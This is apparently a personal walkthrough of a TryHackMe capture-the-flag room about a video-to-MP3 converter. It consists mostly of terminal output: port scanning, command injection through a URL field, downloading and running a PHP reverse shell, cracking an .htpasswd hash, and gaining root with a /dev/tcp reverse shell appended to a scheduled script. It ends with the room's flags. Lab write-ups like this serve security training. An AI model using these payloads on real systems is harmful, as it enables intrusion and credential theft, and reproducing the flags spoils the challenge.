----
My Script to convert videos to MP3 is super secure
----

![](https://i.imgur.com/sE0HfDO.png)

### Task 1  Hack the machine

 Start Machine

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/44f87b4bb655d754fc1f8bc6223d06d7.png)  

You can convert your videos - Why don't you check it out!

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.22.221 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.22.221:22
Open 10.10.22.221:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 13:15 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:15
Completed Parallel DNS resolution of 1 host. at 13:15, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:15
Scanning 10.10.22.221 [2 ports]
Discovered open port 22/tcp on 10.10.22.221
Discovered open port 80/tcp on 10.10.22.221
Completed Connect Scan at 13:15, 0.23s elapsed (2 total ports)
Initiating Service scan at 13:15
Scanning 2 services on 10.10.22.221
Completed Service scan at 13:16, 6.59s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.22.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 10.53s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 1.49s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Nmap scan report for 10.10.22.221
Host is up, received user-set (0.22s latency).
Scanned at 2023-06-22 13:15:57 EDT for 19s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 651bfc741039dfddd02df0531ceb6dec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1FkWVdXpiZN4JOheh/PVSTjXUgnhMNTFvHNzlip8x6vsFTwIwtP0+5xlYGjtLorEAS0KpJLtpzFO4p4PvEzMC40SY8E+i4LaiXHcMsJrbhIozUjZssBnbfgYPiwCzMICKygDSfG83zCC/ZiXeJKWfVEvpCVX1g5Al16mzQQnB3qPyz8TmSQ+Kgy7GRc+nnPvPbAdh8meVGcSl9bzGuXoFFEAH5RS8D92JpWDRuTVqCXGxZ4t4WgboFPncvau07A3Kl8BoeE8kDa3DUbPYyn3gwJd55khaJSxkKKlAB/f98zXfQnU0RQbiAlC88jD2TmK8ovd2IGmtqbuenHcNT01D
|   256 c42804a5c3b96a955a4d7a6e46e214db (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3zR5EsH+zXjBa4GNOE8Vlf04UROD9GrpAgx0mRcrDQvUdmaF0hYse2KixpRS8Pu1qhWKVRP7nz0LX5nbzb4i4=
|   256 ba07bbcd424af293d105d0b34cb1d9b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKsS7+8A3OfoY8qtnKrVrjFss8LQhVeMqXeDnESa6Do
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:16
Completed NSE at 13:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.04 seconds

using burp

yt_url=---;whoami; or |whoami;

"url_orginal":"---;whoami;","output":"www-data\n"

revshell

The $_IFS_ acts as a separator

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

yt_url=|wget${IFS}10.8.19.103:1234/payload_ivan.php;

'payload_ivan.php' saved [9284\/9284]

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.22.221 - - [22/Jun/2023 13:33:10] "GET /payload_ivan.php HTTP/1.1" 200 -

yt_url=|php${IFS}payload_ivan.php;

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.22.221] 49038
SOCKET: Shell has connected! PID: 1491
whoami
www-data
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dmv:/var/www/html$ ls
ls
admin  images  index.php  js  payload_ivan.php	style.css  tmp
www-data@dmv:/var/www/html$ cat index.php
cat index.php
<?php

if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' && $_SERVER['REQUEST_METHOD'] === 'POST')
{    
   $yt_url = explode(" ", $_POST["yt_url"])[0];
   $id = uniqid();
   $filename = $id.".%(ext)s";
   $template = '/var/www/html/tmp/downloads/'. $filename;
   $string = ('youtube-dl --extract-audio --audio-format mp3 ' . $yt_url . ' -f 18 -o ' . escapeshellarg($template));

   $descriptorspec = array(
      0 => array("pipe", "r"),  // stdin
      1 => array("pipe", "w"),  // stdout
      2 => array("pipe", "w"),  // stderr
   );

   $process = proc_open($string, $descriptorspec, $pipes);
   $stdout = stream_get_contents($pipes[1]);
   fclose($pipes[1]);
   $stderr = stream_get_contents($pipes[2]);
   fclose($pipes[2]);
   $ret = proc_close($process);
   echo json_encode(array(
      'status' => $ret, 
      'errors' => $stderr,
      'url_orginal'=>$yt_url, 
      'output' => $stdout,
      'result_url'=> '/tmp/downloads/'.$id . '.mp3', 
   ));
   die();
}

?>

<html>
   <head>
      <script type="text/javascript" src="/js/jquery-3.5.0.min.js"></script>
      <script type="text/javascript" src="/js/main.js"></script>
      <link rel="stylesheet" type="text/css" href="/style.css">
   </head>
   <body>
      <div id="container">
         <div id="logos">
            <img src="images/youtube.png" alt="Youtube to MP3" height="200" width="200" />
            <img src="images/mp3-file.png" alt="Youtube to MP3" height="200" width="200" />
         </div>
         <h3>Convert My Video</h3>
         <label for="ytid">Video ID:</label><input type="text" id="ytid" name="ytid">
         <button type="button" id="convert">Convert!</button>
         <span id="message"></span>
      </div>
   </body>

www-data@dmv:/var/www/html$ cd admin
cd admin
www-data@dmv:/var/www/html/admin$ ls
ls
flag.txt  index.php
www-data@dmv:/var/www/html/admin$ cat flag.txt
cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
www-data@dmv:/var/www/html/admin$ cat index.php
cat index.php
<?php
  if (isset($_REQUEST['c'])) {
      system($_REQUEST['c']);
      echo "Done :)";
  }
?>

<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>

</a>www-data@dmv:/var/www/html/admin$ ls -lah
ls -lah
total 24K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4.0K Jun 22 17:33 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
www-data@dmv:/var/www/html/admin$ cat .htpasswd
cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
www-data@dmv:/var/www/html/admin$ cat .htaccess
cat .htaccess
AuthName "AdminArea"
AuthType Basic
AuthUserFile /var/www/html/admin/.htpasswd
Require valid-user

┌──(witty㉿kali)-[~/Downloads]
└─$ nano hash_youtube
                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_youtube 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jessie           (?)     
1g 0:00:00:00 DONE (2023-06-22 13:41) 33.33g/s 12800p/s 12800c/s 12800C/s alyssa..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ john --show hash_youtube 
?:jessie

1 password hash cracked, 0 left
                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ cat hash_youtube 
$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

itsmeadmin:jessie

http://10.10.22.221/admin/ 

login

http://10.10.22.221/admin/?c=id (backdoor)

uid=33(www-data) gid=33(www-data) groups=33(www-data) Done :)

www-data@dmv:/var/www/html/admin$ cd /var/www/html/tmp/
cd /var/www/html/tmp/
www-data@dmv:/var/www/html/tmp$ ls
ls
clean.sh
www-data@dmv:/var/www/html/tmp$ cat clean.sh
cat clean.sh
rm -rf downloads
www-data@dmv:/var/www/html/tmp$ ls -lah
ls -lah
total 12K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4.0K Jun 22 17:33 ..
-rw-r--r-- 1 www-data www-data   17 Apr 12  2020 clean.sh

www-data@dmv:/var/www/html/tmp$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1" >> clean.sh
<h -i >& /dev/tcp/10.8.19.103/4444 0>&1" >> clean.sh
www-data@dmv:/var/www/html/tmp$ cat clean.sh
cat clean.sh
rm -rf downloads
/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                                     
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.22.221] 50724
bash: cannot set terminal process group (1655): Inappropriate ioctl for device
bash: no job control in this shell
root@dmv:/var/www/html/tmp# cd /root
cd /root
root@dmv:~# ls
ls
root.txt
root@dmv:~# cat root.txt
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}


```

What is the name of the secret folder?  

*admin*

What is the user to access the secret folder?  

*itsmeadmin*

What is the user flag?

*flag{0d8486a0c0c42503bb60ac77f4046ed7}*

What is the root flag?

*flag{d9b368018e912b541a4eb68399c5e94a}*


[[Templates]]